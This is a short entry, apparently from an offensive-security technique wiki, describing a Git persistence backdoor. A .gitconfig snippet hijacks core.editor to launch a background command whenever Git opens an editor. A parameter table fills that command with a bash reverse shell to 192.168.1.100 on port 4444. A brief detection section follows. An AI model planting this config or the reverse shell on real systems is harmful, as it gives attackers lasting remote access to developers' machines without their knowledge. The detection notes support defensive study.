---
type: code
language: ini
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - persistence
  - backdoor
  - git
validated: true
---

# Git-Config-Editor-Backdoor

## Code

```ini
[core]
editor = nohup BACKDOOR >/dev/null 2>&1 & ${VISUAL:-${EDITOR:-emacs}}
```

## Description

Configuration snippet for .gitconfig to hijack the core.editor, running a backdoor command before the legitimate editor during Git commits or rebases.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `BACKDOOR` | Malicious command (e.g., reverse shell) | `bash -i >& /dev/tcp/192.168.1.100/4444 0>&1` |

## Usage

Add to ~/.gitconfig manually or via git config. Triggers on any Git operation opening an editor, providing persistence tied to developer workflows.

## Detection

- Anomalous nohup processes spawned by git.
- Unexpected network connections during Git usage.
- Integrity checks on .gitconfig showing editor modifications.

## Related

- [[procedures/Backdoor-Git-User-Configurations-for-Persistence]]
